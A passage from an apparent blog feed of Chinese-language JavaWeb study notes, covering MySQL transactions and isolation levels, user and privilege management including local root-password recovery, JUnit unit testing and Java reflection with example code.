class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622095410518.png" alt="image-20220622095410518"></p><h1 id="13-事务"><a class="markdownIt-Anchor" href="#13-事务">#</a> 13、事务</h1><ol><li>事务的基本介绍</li><li>事务的四大特征 **（常见面试题）**</li><li>事务的隔离级别（了解）</li></ol><h2 id="131-事务的基本介绍"><a class="markdownIt-Anchor" href="#131-事务的基本介绍">#</a> 13.1 事务的基本介绍</h2><ul><li>概念：如果一个包含多个步骤的业务操作，被事务管理，那么这些操作要么同时成功，要么同时失败</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622095951058.png" alt="image-20220622095951058"></p><ul><li><p>操作：</p><ol><li>开启事务：<strong>start transaction</strong></li><li>回滚：<strong>rollback</strong></li><li>提交：<strong>commit</strong></li></ol></li><li><p>MySQL 数据库中事务默认自动提交，Oracle 数据库默认是<strong>手动提交事务</strong></p><ul><li>事务提交的两种方式：<ul><li>自动提交：<ul><li>mysql 就是自动提交的</li><li>一条 DML（增删改）语句会自动提交一次事务</li></ul></li><li>手动提交：<ul><li>需要先开启事务，再提交</li></ul></li></ul></li><li>修改事务的默认提交方式</li></ul></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查看事务的默认提交方式</span><span class="token keyword">select</span> @<span class="token variable">@autocommmit</span><span class="token punctuation">;</span> <span class="token comment">#结果为1表示自动提交，结果为0表示手动提交</span><span class="token comment">-- 修改默认提交方式</span><span class="token keyword">set</span> @<span class="token variable">@autocommit</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">#这时候写了DML语句，不手动提交是不会生效的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="132-事务的四大特征"><a class="markdownIt-Anchor" href="#132-事务的四大特征">#</a> 13.2 事务的四大特征 ***</h2><ol><li>原子性：是不可分割的最小操作单位，要么同时成功，要么同时失败</li><li>持久型：当事务提交或回滚后，数据库会持久化地保存数据</li><li>隔离性：多个事务之间相互独立</li><li>一致性：事务操作前后数据总量不变</li></ol><h2 id="133-事务的隔离级别"><a class="markdownIt-Anchor" href="#133-事务的隔离级别">#</a> 13.3 事务的隔离级别</h2><ul><li><p>概念：多个事务之间是隔离的，相互独立的，但是如果多个事务操作同一批数据，则会引发问题，设置不同的隔离级别就可以解决这些问题。</p></li><li><p>存在的问题：</p><ol><li>脏读：一个事务，读取到另一个事务中没有提交的数据</li><li>不可重复度（虚读）：在同一个事务中两次读取到的数据不一样</li><li>幻读：一个事务操作（DML）数据表中所有的记录，另一个事务添加了一条数据，则第一个事务查询不到自己的修改</li></ol></li><li><p>隔离级别：</p><ol><li>read uncommitted：读未提交<ul><li>会产生的问题：脏读、不可重复度、幻读</li></ul></li><li>read committed：读已提交（Oracle 默认隔离级别）<ul><li>会产生的问题：不可重复度、幻读</li></ul></li><li>repeatable read：可重复度（MySQL 中默认隔离级别）<ul><li>会产生的问题：幻读</li></ul></li><li>serializable：串行化<ul><li>可以解决所有的问题</li></ul></li></ol></li><li><p>注意：隔离级别从小到大，安全性越来越高，但是效率越来越低</p></li><li><p>数据隔离级别查询和设置</p></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询隔离级别：</span><span class="token keyword">select</span> @<span class="token variable">@tx_isolation</span><span class="token punctuation">;</span><span class="token comment">-- 设置隔离级别：</span><span class="token keyword">set</span> <span class="token keyword">global</span> <span class="token keyword">transaction</span> <span class="token keyword">isolation</span> <span class="token keyword">level</span> 级别字符串<span class="token punctuation">;</span> <span class="token comment">#字符串就是上面的4个</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="14-dcl管理用户授权"><a class="markdownIt-Anchor" href="#14-dcl管理用户授权">#</a> 14、DCL：管理用户，授权</h1><ul><li>DBA：数据库管理员<ol><li>管理用户</li><li>授权</li></ol></li></ul><h2 id="141-用户管理"><a class="markdownIt-Anchor" href="#141-用户管理">#</a> 14.1 用户管理</h2><ol><li>添加用户</li><li>删除用户</li><li>修改用户密码<ul><li>MySQL 中忘记 root 密码<ol><li>以 CMD 执行 net stop mysql 停止 mysql 服务（管理员权限）</li><li>使用无验证方式启动 MySQL 服务：mysqld --skip-grant-tables</li><li>打开新的 cmd 窗口，直接输入 mysql 命令回车就可以登录成功</li><li>use mysql;</li><li>update user set password = password (‘新密码’) where user = ‘root’;</li><li>关闭这两个窗口</li><li>打开任务管理器，手动结束 mysqld.exe 进程</li><li>使用新密码登录</li></ol></li></ul></li><li>查询用户<ul><li>通配符 %：表示可以在任意主机使用用户登录数据库</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 切换到mysql数据库</span><span class="token keyword">USE</span> mysql<span class="token punctuation">;</span><span class="token comment">-- 查询user表</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">USER</span><span class="token punctuation">;</span><span class="token comment">-- 创建用户</span><span class="token keyword">create</span> <span class="token keyword">user</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span> identified <span class="token keyword">by</span> <span class="token string">'密码'</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'zhangsan'</span><span class="token variable">@'localhost'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token comment">-- 删除用户</span><span class="token keyword">DROP</span> <span class="token keyword">USER</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span><span class="token punctuation">;</span><span class="token keyword">DROP</span> <span class="token keyword">USER</span> <span class="token string">'zhangsan'</span><span class="token variable">@'localhost'</span><span class="token punctuation">;</span><span class="token comment">-- 修改用户密码</span><span class="token keyword">UPDATE</span> <span class="token keyword">USER</span> <span class="token keyword">SET</span> PASSWORD <span class="token operator">=</span> PASSWORD<span class="token punctuation">(</span><span class="token string">'新密码'</span><span class="token punctuation">)</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span> <span class="token operator">=</span> <span class="token string">'用户名'</span><span class="token punctuation">;</span><span class="token keyword">SET</span> PASSWORD <span class="token keyword">FOR</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span> <span class="token operator">=</span> PASSWORD<span class="token punctuation">(</span><span class="token string">'新密码'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="142-权限管理"><a class="markdownIt-Anchor" href="#142-权限管理">#</a> 14.2 权限管理</h2><ol><li>查询权限</li><li>授予权限</li><li>撤销权限</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询权限</span><span class="token keyword">SHOW</span> GRANTS <span class="token keyword">FOR</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span><span class="token punctuation">;</span><span class="token keyword">SHOW</span> GRANTS <span class="token keyword">FOR</span> <span class="token string">'zhangsan'</span><span class="token variable">@'localhost'</span><span class="token punctuation">;</span><span class="token comment">-- 授予权限</span><span class="token keyword">GRANT</span> 权限列表 <span class="token keyword">ON</span> 数据库名<span class="token punctuation">.</span>表名 <span class="token keyword">TO</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> db3<span class="token punctuation">.</span>dept <span class="token keyword">TO</span> <span class="token string">'zhangsan'</span><span class="token variable">@'localhost'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">ALL</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'zhangsan'</span><span class="token variable">@'localhost'</span><span class="token punctuation">;</span><span class="token comment">#将所有表的所有权限授予zhangsan</span><span class="token comment">-- 撤销权限</span><span class="token keyword">REVOKE</span> 权限列表 <span class="token keyword">ON</span> 数据库名<span class="token punctuation">.</span>表名 <span class="token keyword">FROM</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span><span class="token punctuation">;</span><span class="token keyword">REVOKE</span> <span class="token keyword">UPDATE</span> <span class="token keyword">ON</span> DB3<span class="token punctuation">.</span>ACCOUNT <span class="token keyword">FROM</span> <span class="token string">'LISI'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;JavaWeb - 数据库&lt;/p&gt;
&lt;h1 id=&quot;1-数据库的相关概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-数据库的相关概念&quot;&gt;#&lt;/a&gt; 1、数据库的相关概念&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;数据库&lt;/li&gt;
&lt;li&gt;数据库管理系统</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>junit、反射</title>
    <link href="http://example.com/post/junit%E3%80%81%E6%B3%A8%E8%A7%A3%E3%80%81%E5%8F%8D%E5%B0%84.html"/>
    <id>http://example.com/post/junit%E3%80%81%E6%B3%A8%E8%A7%A3%E3%80%81%E5%8F%8D%E5%B0%84.html</id>
    <published>2022-06-19T12:28:37.000Z</published>
    <updated>2022-06-20T00:48:00.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-junit单元测试"><a class="markdownIt-Anchor" href="#1-junit单元测试">#</a> 1、junit 单元测试</h1><h2 id="11-测试分类"><a class="markdownIt-Anchor" href="#11-测试分类">#</a> 1.1 测试分类：</h2><ol><li>黑盒测试：不用具体关注里面的代码内容，只要输入 input，经过代码的执行查看 output 是否达到预期，不需要写测试代码</li><li>白盒测试：也需要 input 和 output，但是输入了之后代码的执行，代码的逻辑、算法、严谨度、效率等都要关注，需要写测试代码</li></ol><p>junit 就是白盒测试的一种</p><h2 id="12-junit的使用"><a class="markdownIt-Anchor" href="#12-junit的使用">#</a> 1.2 junit 的使用</h2><ul><li><p>步骤</p><ol><li>定义一个测试类（测试用例）<ul><li>建议：<ol><li>测试类名：被测试类名 Test，如 CalculatorTest</li><li>包名：xxx.xxx.xx.test，如 cn.itclass.test</li></ol></li></ul></li><li>定义测试方法：可以独立运行<ul><li>建议：<ol><li>方法名：test 测试方法名，如 testAdd ()</li><li>返回值：void</li><li>参数列表：空参</li></ol></li></ul></li><li>给这个方法加 @Test</li><li>导入 Junit 依赖环境（点击红灯泡，添加 junit 到 classpath）—— 视频课包为 org.junit.Test，自己补全的为 <code>org.testng.annotations.Test;</code> ，但是能用<ul><li>运行成功后会显示绿色 Test passed</li><li>使用 junit 的时候看的不是输出的结果，看的是红色还是绿色，红色表示失败，绿色表示成功</li></ul></li></ol></li><li><p>判定结果</p><ul><li>红色：失败</li><li>绿色：成功</li><li>可以使用 Assert 对结果进行判定，如果判定结果成功就是绿色，结果与断言结果不一样是红色<ul><li>Assert：静态类，使用 Assert.assertEquals (期望值，真实值)</li><li>判定结果的时候一般不进行输出</li></ul></li></ul></li><li><p>可以在一个 junit 类里面定义多个方法，然后点击对应方法的绿色小箭头单独运行</p></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>caculater</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">After</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Before</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>testng<span class="token punctuation">.</span></span><span class="token class-name">Assert</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CalculatorTest</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Before</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"before"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 测试add方法     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testAdd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"我被执行了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//1.创建计算器对象</span>        caculater a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">caculater</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> sum <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.调用add方法</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.断言：我断言的结果是3，如果是一样的就是</span>        <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@After</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"结束了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>补充<ul><li>@Before：<ul><li>修饰的方法会在测试方法之前被自动执行</li></ul></li><li>@After：<ul><li>修饰的方法会在测试方法执行之后被自动执行</li></ul></li></ul></li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>注：导包的时候一定要使用 <code>org.junit</code> ，如果导入的是 org.testng.annotations.Test，Test 可以正常使用，Before 和 After 不能</p></blockquote><h1 id="2-反射框架设计的灵魂"><a class="markdownIt-Anchor" href="#2-反射框架设计的灵魂">#</a> 2、反射：框架设计的灵魂</h1><ul><li><p>框架：半成品软件。可以在框架的基础上进行软件的开发，简化编码</p></li><li><p>反射：将类的各个组成部分封装为其他对象，这个过程称为<strong>反射机制</strong></p></li><li><p>java 代码在计算机中运行的三个阶段：</p><ol><li><p>Source 源代码阶段：写完一个类之后，使用 javac 进行编译，编译后成为一个 class 字节码文件，里面分三个区域，一个存档成员变量，一个存放构造方法，一个存放成员方法</p></li><li><p>Class 类对象阶段：类加载器 ClassLoader 将字节码文件加载到内存中，内存中会有一个<strong> Class 类</strong>对象来描述字节码文件，这个对象中有成员变量、构造方法、成员方法，成员变量封装成<strong> Field</strong> 对象，构造方法封装为<strong> Constructor</strong> 对象，成员方法封装为<strong> Method</strong> 对象，这三个对象在 Class 类对象里面组成 Class 类，由于变量可能有多个，于是使用一个数组来描述成员内容如下</p><ul><li>Field [] fields</li><li>Constructor[] cons</li><li>Method[] methods</li></ul><p>这些组成一个类对象，之后可以使用这些类对象进行实例化等</p></li><li><p>Runtime 运行阶段：Person 对象 new Person ();</p></li></ol></li><li><p>好处：</p><ol><li>可以在程序运行过程中去操作这些对象。</li><li>可以解耦，提高程序的可扩展性</li></ol></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220619175957838.png" alt="image-20220619175957838"></p><h2 id="21-获取class类对象的方式"><a class="markdownIt-Anchor" href="#21-获取class类对象的方式">#</a> 2.1 获取 Class 类对象的方式</h2><ol><li><strong>Class.forName (“全类名”)</strong>：是将字节码文件加载进内存，返回 Class 对象<ul><li>多用于配置文件，将类名可以定义在配置文件中。读取文件，加载类</li></ul></li><li><strong>类名.class</strong>：通过类名的属性 class 来获取<ul><li>多用于参数的传递</li></ul></li><li><strong>对象.getClass ()</strong>：getClass () 方法在 Object 类中定义着<ul><li>多用于对象的获取字节码的方式，有对象了想获取字节码文件对象</li></ul></li></ol><ul><li>结论：同一个字节码文件 (*.class) 在一次程序的运行过程中，只会被加载一次，不论通过哪一种方式获取的 Class 对象都是同一个</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>reflect</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Student</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectDemo1</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1.Class.forName("全类名")</span>        <span class="token class-name">Class</span> cls1 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"cn.itclass.domain.Person"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.类名.class</span>        <span class="token class-name">Class</span> cls2 <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.对象.getClass()</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> cls3 <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls3<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//==比较这三个对象</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls1 <span class="token operator">==</span> cls2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls1 <span class="token operator">==</span> cls3<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>        <span class="token class-name">Class</span> cls4 <span class="token operator">=</span> <span class="token class-name">Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cls1 <span class="token operator">==</span> cls4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="22-class对象功能"><a class="markdownIt-Anchor" href="#22-class对象功能">#</a> 2.2 Class 对象功能</h2><ul><li>获取功能：<ol><li>获取成员变量们<ol><li>Field [] getFields ()：获取所有<strong> public</strong> 修饰的成员变量</li><li>Field getField (String name)：获取指定名称的<strong> public</strong> 修饰的成员变量</li><li>Field [] getDeclaredFields ()：获取所有成员变量，<strong>不考虑访问修饰符</strong></li><li>Field getDeclaredField (String name)：获取指定名称的成员变量，<strong>不考虑访问修饰符</strong></li></ol></li><li>获取构造方法们<ol><li>Constructer&lt;?&gt;[] getConstructors ()：获取所有<strong> public</strong> 修饰的构造方法</li><li>Constructer&lt;T&gt; getConstructor (类 &lt;?&gt;… parameterTypes)：获取指定 public 修饰构造方法，这里要的参数是构造参数对象</li><li>Constructer&lt;?&gt;[] getDeclaredConstructors ()：获取所有构造方法，<strong>不考虑访问修饰符</strong></li><li>Constructer&lt;T&gt; getDeclaredConstructor (类 &lt;?&gt;… parameterTypes)：获取指定构造方法，<strong>不考虑访问修饰符</strong></li></ol></li><li>获取成员方法们<ol><li>Method [] getMethods ()：获取所有 public 修饰的方法</li><li>Method getMethod ()：获取指定<strong> public</strong> 方法，参数为<strong>方法名和参数列表</strong></li><li>Method [] getDeclaredMethods ()：获取所有方法，<strong>不考虑访问修饰符</strong></li><li>Method getDeclaredMethod ()：获取指定方法，<strong>不考虑访问修饰符</strong>，参数为<strong>方法名和参数列表</strong></li></ol></li><li>获取类名<ol><li>String getName()</li></ol></li></ol></li><li>Field：成员变量<ul><li>操作：<ol><li>设置值<ul><li>set (Object obj, Object value)：给 obj 对象设置 value 值</li></ul></li><li>获取值<ul><li>get (Object obj)：获取指定对象的值，比如 get§，获取的是 p 里的这个成员变量的值</li></ul></li><li>忽略访问权限修饰符的安全检查<ul><li>setAccessible (true)：暴力反射，Field 对象中的方法</li></ul></li></ol></li></ul></li><li>Constructor：构造方法<ul><li>创建对象：T newInstance (Object … initargs)</li><li>如果使用空参数构造方法创建对象，操作可以简化：Class 对象的 newInstance</li></ul></li><li>Method：方法<ul><li>执行方法：invoke (Object obj, Object… args)，参数为对象和实际参数列表</li><li>获取方法名称：<ul><li>String getName：获取方法名</li></ul></li></ul></li><li>获取类名<ul><li>Class 对象.getName; 获取的是全类名</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>reflect</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token comment">/*获取成员变量*/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectDemo2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//0.获取person的class对象</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> personClass <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment">//1.Field[] getFields()</span>        <span class="token class-name">Field</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Field</span> field<span class="token operator">:</span>fields<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//2.Field getField(String name)</span>        <span class="token class-name">Field</span> a <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取成员变量a的值</span>        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> value <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token string">"张三"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token 